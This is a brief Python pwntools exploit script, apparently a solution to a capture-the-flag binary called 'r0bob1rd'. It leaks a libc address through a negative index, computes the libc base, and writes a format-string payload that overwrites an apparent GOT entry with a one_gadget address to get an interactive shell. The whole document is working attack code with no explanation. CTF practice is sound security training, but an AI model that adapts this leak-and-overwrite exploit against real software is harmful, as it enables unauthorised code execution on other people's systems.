from pwn import *
p = process("r0bob1rd")
context.bits = 64

p.sendlineafter(b'> ', b'-8')
p.recvuntil(b'chosen: ')
libcBase = u64(p.recv(6) + b'\x00' * 2) - 0x84ce0

log.info(f"libcBase : {hex(libcBase)}")
log.info(f"oneGadget : {hex(libcBase+0xe3b01)}")

payload = fmtstr_payload(8, {0x602028: libcBase+0xe3b01}, write_size="short")
p.sendlineafter(b"> ", payload.ljust(106, b'\x90'))

p.interactive()
